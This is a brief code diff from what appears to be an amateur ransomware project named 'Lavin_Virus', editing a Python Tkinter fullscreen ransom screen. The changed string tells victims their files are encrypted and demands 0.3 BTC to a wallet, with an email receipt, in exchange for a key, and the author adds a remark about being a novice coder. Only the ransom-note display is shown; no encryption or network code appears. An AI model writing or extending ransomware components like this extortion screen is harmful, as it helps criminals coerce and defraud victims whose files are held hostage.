@@ -17,7 +17,7 @@ root = Tk()
 # Adjust size
 width = root.winfo_screenmmwidth()
 height =  root.winfo_screenheight()
-text = " hi, this is Lavin_Virus,\n ur files are encrypted.\n If u wanna descript ur file u should pay 0.3 BTC on wallet(___________)\n and send receipt on this emal(___________)\n Next u will get a key."
+text = " hi, this is Lavin_Virus,\n ur files are encrypted.\n If u wanna descript ur file u should pay 0.3 BTC on wallet(___________)\n and send receipt on this emal(___________)\n Next u will get a key.\n I don't recommend to close this program, i have studied how to code and i don't sure that all will work right) "
 root.attributes("-fullscreen", True)
 root.configure(bg="black")
 label = Label(root, text=text, fg="red", bg="black", font=("Old English Text MT", 20))
